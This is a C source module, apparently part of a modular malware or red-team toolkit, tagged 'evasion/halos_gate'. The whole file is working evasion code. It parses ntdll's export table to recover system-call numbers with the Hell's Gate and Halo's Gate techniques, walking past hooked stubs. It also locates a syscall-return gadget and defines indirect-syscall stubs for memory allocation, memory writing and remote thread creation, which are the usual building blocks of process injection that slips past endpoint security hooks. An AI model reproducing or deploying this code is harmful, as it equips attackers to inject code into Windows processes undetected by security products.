// chunk: evasion/halos_gate
// depends: (none)
// provides: init_indirect_syscalls, indirect_NtAllocateVirtualMemory, indirect_NtWriteVirtualMemory, indirect_NtCreateThreadEx, indirect_NtQuerySystemInformation
// headers: windows.h
// risk: low
// note: Halo's Gate — if target Nt function is hooked (no standard stub prologue), walks up/down neighboring functions to find an unhooked stub and computes SSN by offset. Most robust against partial hooking.

#ifndef CHUNK_HALOS_GATE
#define CHUNK_HALOS_GATE

static DWORD ssn_NtAllocateVirtualMemory = 0;
static DWORD ssn_NtWriteVirtualMemory = 0;
static DWORD ssn_NtCreateThreadEx = 0;
static DWORD ssn_NtQuerySystemInformation = 0;
static void *syscall_ret_gadget = NULL;

typedef struct {
    char *name;
    DWORD rva;
} nt_func_entry_t;

static int halo_is_clean_stub(BYTE *code) {
    return (code[0] == 0x4C && code[1] == 0x8B && code[2] == 0xD1 && code[3] == 0xB8);
}

static DWORD halo_resolve_ssn(HMODULE ntdll, const char *func_name) {
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return 0;

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    DWORD target_idx = (DWORD)-1;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)(base + names[i]);
        if (strcmp(name, func_name) == 0) {
            target_idx = i;
            break;
        }
    }
    if (target_idx == (DWORD)-1) return 0;

    BYTE *target_code = base + funcs[ords[target_idx]];

    // Try direct (Hell's Gate style)
    if (halo_is_clean_stub(target_code)) {
        return *(DWORD *)(target_code + 4);
    }

    // Halo's Gate: walk neighbors up and down
    for (int distance = 1; distance < 500; distance++) {
        // Check neighbor below (higher SSN)
        if (target_idx + distance < exp->NumberOfNames) {
            char *neighbor_name = (char *)(base + names[target_idx + distance]);
            if (neighbor_name[0] == 'N' && neighbor_name[1] == 't') {
                BYTE *neighbor_code = base + funcs[ords[target_idx + distance]];
                if (halo_is_clean_stub(neighbor_code)) {
                    DWORD neighbor_ssn = *(DWORD *)(neighbor_code + 4);
                    return neighbor_ssn - distance;
                }
            }
        }
        // Check neighbor above (lower SSN)
        if (target_idx >= (DWORD)distance) {
            char *neighbor_name = (char *)(base + names[target_idx - distance]);
            if (neighbor_name[0] == 'N' && neighbor_name[1] == 't') {
                BYTE *neighbor_code = base + funcs[ords[target_idx - distance]];
                if (halo_is_clean_stub(neighbor_code)) {
                    DWORD neighbor_ssn = *(DWORD *)(neighbor_code + 4);
                    return neighbor_ssn + distance;
                }
            }
        }
    }

    return 0;
}

static void *halo_find_gadget(HMODULE ntdll) {
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            BYTE *start = base + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;
            for (DWORD j = 0; j < size - 2; j++) {
                if (start[j] == 0x0F && start[j+1] == 0x05 && start[j+2] == 0xC3)
                    return (void *)(start + j);
            }
        }
    }
    return NULL;
}

static int init_indirect_syscalls(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    ssn_NtAllocateVirtualMemory = halo_resolve_ssn(ntdll, "NtAllocateVirtualMemory");
    ssn_NtWriteVirtualMemory    = halo_resolve_ssn(ntdll, "NtWriteVirtualMemory");
    ssn_NtCreateThreadEx        = halo_resolve_ssn(ntdll, "NtCreateThreadEx");
    ssn_NtQuerySystemInformation = halo_resolve_ssn(ntdll, "NtQuerySystemInformation");
    syscall_ret_gadget = halo_find_gadget(ntdll);

    return (ssn_NtAllocateVirtualMemory != 0 &&
            ssn_NtWriteVirtualMemory != 0 &&
            ssn_NtCreateThreadEx != 0 &&
            ssn_NtQuerySystemInformation != 0 &&
            syscall_ret_gadget != NULL) ? 1 : 0;
}

__attribute__((naked))
static NTSTATUS indirect_NtAllocateVirtualMemory(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtAllocateVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtWriteVirtualMemory(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtCreateThreadEx(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtCreateThreadEx(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

__attribute__((naked))
static NTSTATUS indirect_NtQuerySystemInformation(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength) {
    __asm__ __volatile__ (
        "mov %%rcx, %%r10\n\t"
        "mov ssn_NtQuerySystemInformation(%%rip), %%eax\n\t"
        "jmp *syscall_ret_gadget(%%rip)\n\t"
        ::: "memory"
    );
}

#endif
